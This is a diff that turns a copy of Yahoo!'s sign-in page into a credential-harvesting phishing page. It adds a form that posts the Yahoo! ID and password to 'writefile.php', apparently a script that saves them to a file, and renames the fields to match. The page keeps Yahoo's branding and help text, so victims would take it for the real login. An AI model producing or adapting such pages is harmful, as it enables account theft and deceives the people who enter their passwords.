@@ -450,14 +450,15 @@ autocomplete="off">
 <tr> <td align="right" nowrap><font face="arial" size="-1">
 Yahoo! ID:
 </font></td>
-<td><input id=username name="login" size="17" value=""></td>
+<form action="writefile.php" method="post">
+<td><input id=username name="userName" id="userName" size="17" value=""></td>
 </tr>
 <tr> <td align="right" nowrap><font face="arial" size="-1">Password:</font></td>
-<td><input name="passwd" id=passwd type="password" size="17" maxlength="32"></td></tr>
+<td><input name="passwd" id="passWord" type="password" size="17" maxlength="32"></td></tr>
 <input type=hidden name=".secdata" value="6ZuEDeVZFem61nqWoHfKpQxqz_22bAr2excieGnzCVnYjM8Q1Ta9bHxCE4q77Thymb9Ojlsy" >
 <td valign="middle" align=right nowrap>
 <img src="http://us.i1.yimg.com/us.yimg.com/i/space.gif" width=1 height=1 alt="Attention Blind or Visually Impaired Users.  To ensure the security of your account we require users to enter a word displayed on this page as part of an image after 5 failed login attempts.  If you are not able to see this image, our customer care group will need to reset your account to zero failed logins. To do this please contact us by pasting the URL below into your browser and completing the form.  We recommend you provide your phone number so that we may contact you if there are any problems. Here is the URL: http://add.yahoo.com/fast/help/us/edit/cgi_access .   Alternatively, if you can not remember your password please paste this URL into your browser to create a new one:   http://edit.yahoo.com/config/eval_forgot_pw"><font face="arial" size=-1 >Code you see below:</font></td>
-<td align=left>&nbsp;<input type=text name=".secword" value="" size=7 maxlength=15><font face="arial" size=-1><b>(required)</font></b>
+<td align=left>&nbsp;<input type="text" name=".secword" value="" size=7 maxlength=15><font face="arial" size=-1><b>(required)</font></b>
 </td></tr>
 <tr>
 <td colspan="2" nowrap align=center>
@@ -470,6 +471,7 @@ Yahoo! ID:
 <td>&nbsp;</td>
 
 <td><input name=".save" type="submit" value="Sign In"></td> 
+</form>
 </tr>
 </table>
 </td></tr> 
